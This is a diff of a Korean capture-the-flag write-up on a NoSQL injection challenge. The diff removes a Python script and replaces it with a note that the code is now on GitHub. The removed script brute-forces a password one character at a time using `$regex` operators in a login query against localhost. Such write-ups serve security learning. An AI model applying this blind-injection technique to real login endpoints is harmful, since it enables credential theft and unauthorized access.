@@ -81,25 +81,7 @@ admin
 
 3. Exploit Code 작성
 이제는 한글자씩 알아내야하므로, 여러번 쿼리를 전달해야하는데 이를 자동화하는 스크립트 코드를 작성하여 실행한다.
-
-```
-import requests, string
-
-HOST = 'http://localhost'
-ALPHANUMERIC = string.digits + string.ascii_letters
-SUCCESS = 'admin'
-
-flag = ''
-
-for i in range(32):
-    for ch in ALPHANUMERIC:
-        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
-        if response.text == SUCCESS:
-            flag += ch
-            break
-    
-    print(f'FLAG: DH{{{flag}}}')
-```
+코드는 깃허브에 따로 업로드 하였습니다.
 
 # kali linux 에서 코드 작성 후 실행
 
